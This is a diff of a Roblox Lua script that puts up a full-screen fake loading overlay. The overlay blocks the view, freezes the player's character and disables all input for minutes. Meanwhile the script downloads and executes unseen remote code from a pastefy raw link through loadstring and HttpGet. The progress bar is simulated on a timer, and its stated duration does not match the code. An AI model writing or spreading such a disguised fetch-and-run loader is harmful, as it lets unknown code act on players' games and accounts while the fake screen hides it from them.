@@ -1,66 +1,102 @@
--- SERVICES
-local Players = game:GetService("Players")
-local TweenService = game:GetService("TweenService")
-local HttpService = game:GetService("HttpService")
-local LocalPlayer = Players.LocalPlayer
-
--- FREEZE MOVEMENT
-local function freezePlayer()
-	local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
-	local humanoid = character:WaitForChild("Humanoid")
-	humanoid.WalkSpeed = 0
-	humanoid.JumpPower = 0
-end
-
--- UNFREEZE
-local function unfreezePlayer()
-	local character = LocalPlayer.Character
-	if character and character:FindFirstChild("Humanoid") then
-		character.Humanoid.WalkSpeed = 16
-		character.Humanoid.JumpPower = 50
-	end
-end
-
--- LOADING UI
+-- DISPLAY LOADING UI
 local screenGui = Instance.new("ScreenGui")
 screenGui.Name = "CustomLoadingScreen"
 screenGui.IgnoreGuiInset = true
 screenGui.ResetOnSpawn = false
-screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+screenGui.DisplayOrder = 99999
+screenGui.Parent = PlayerGui
 
-local frame = Instance.new("Frame")
-frame.Size = UDim2.new(1, 0, 1, 0)
-frame.Position = UDim2.new(0, 0, 0, 0)
-frame.BackgroundColor3 = Color3.new(0, 0, 0)
-frame.BackgroundTransparency = 0
-frame.BorderSizePixel = 0
-frame.Parent = screenGui
+local background = Instance.new("Frame")
+background.BackgroundColor3 = Color3.new(0, 0, 0)
+background.Size = UDim2.new(1, 0, 1, 0)
+background.BorderSizePixel = 0
+background.Parent = screenGui
 
-local label = Instance.new("TextLabel")
-label.Size = UDim2.new(1, 0, 0, 60)
-label.Position = UDim2.new(0, 0, 0.5, -30)
-label.BackgroundTransparency = 1
-label.TextColor3 = Color3.new(1, 1, 1)
-label.Font = Enum.Font.GothamBold
-label.Text = "🔄 Loading script..."
-label.TextScaled = true
-label.Parent = frame
+local loadingText = Instance.new("TextLabel")
+loadingText.Size = UDim2.new(1, 0, 0, 60)
+loadingText.Position = UDim2.new(0, 0, 0.3, 0)
+loadingText.BackgroundTransparency = 1
+loadingText.Text = "Loading Script..."
+loadingText.TextColor3 = Color3.new(1, 1, 1)
+loadingText.TextStrokeTransparency = 0
+loadingText.TextScaled = true
+loadingText.Font = Enum.Font.GothamBold
+loadingText.Parent = screenGui
 
--- START
-freezePlayer()
+local subText = Instance.new("TextLabel")
+subText.Size = UDim2.new(1, 0, 0, 40)
+subText.Position = UDim2.new(0, 0, 0.75, 0)
+subText.BackgroundTransparency = 1
+subText.Text = "⚠️ This could take up to five minutes..."
+subText.TextColor3 = Color3.new(1, 1, 1)
+subText.TextStrokeTransparency = 0.5
+subText.TextScaled = true
+subText.Font = Enum.Font.GothamBold
+subText.Parent = screenGui
 
-task.spawn(function()
-	-- Run your external script
-	local success, err = pcall(function()
-		loadstring(game:HttpGet("https://pastefy.app/oUQ3Lvec/raw"))()
-	end)
+local barContainer = Instance.new("Frame")
+barContainer.Size = UDim2.new(0.6, 0, 0.05, 0)
+barContainer.Position = UDim2.new(0.2, 0, 0.6, 0)
+barContainer.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+barContainer.BorderSizePixel = 0
+barContainer.Parent = screenGui
 
-	-- Cleanup
-	if not success then
-		label.Text = "❌ Error loading script"
-		warn("Script load error:", err)
-	else
-		unfreezePlayer()
-		screenGui:Destroy()
-	end
+local progressBar = Instance.new("Frame")
+progressBar.Size = UDim2.new(0, 0, 1, 0)
+progressBar.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
+progressBar.BorderSizePixel = 0
+progressBar.Parent = barContainer
+
+local percentLabel = Instance.new("TextLabel")
+percentLabel.Size = UDim2.new(1, 0, 1, 0)
+percentLabel.BackgroundTransparency = 1
+percentLabel.Text = "0%"
+percentLabel.TextColor3 = Color3.new(1, 1, 1)
+percentLabel.TextScaled = true
+percentLabel.Font = Enum.Font.GothamBold
+percentLabel.Parent = barContainer
+
+-- Freeze player by disabling movement
+local player = game.Players.LocalPlayer
+local character = player.Character or player.CharacterAdded:Wait()
+local humanoid = character:WaitForChild("Humanoid")
+
+-- Disable player movement
+humanoid.WalkSpeed = 0
+humanoid.JumpPower = 0
+humanoid.PlatformStand = true
+
+-- Prevent the user from interacting with the game (disable input)
+local playerModule = require(game:GetService("Players").PlayerScripts:WaitForChild("PlayerModule"))
+local playerControls = playerModule:GetControls()
+playerControls:Disable()
+
+-- Run the external script immediately
+spawn(function()
+    -- Load the external script
+    loadstring(game:HttpGet("https://pastefy.app/oUQ3Lvec/raw"))()
+
+    -- Simulate progress
+    local startTime = tick()
+    while true do
+        local progress = math.clamp((tick() - startTime) / 420, 0, 1)
+        progressBar.Size = UDim2.new(progress, 0, 1, 0)
+        percentLabel.Text = math.floor(progress * 100) .. "%"
+        if progress >= 1 then
+            -- Re-enable player movement after script finishes loading
+            humanoid.WalkSpeed = 16
+            humanoid.JumpPower = 50
+            humanoid.PlatformStand = false
+
+            -- Re-enable player controls
+            playerControls:Enable()
+            break
+        end
+        task.wait(1)
+    end
+end)
+
+-- Destroy the loading screen after a timeout
+task.delay(900, function()
+    if screenGui then screenGui:Destroy() end
 end)
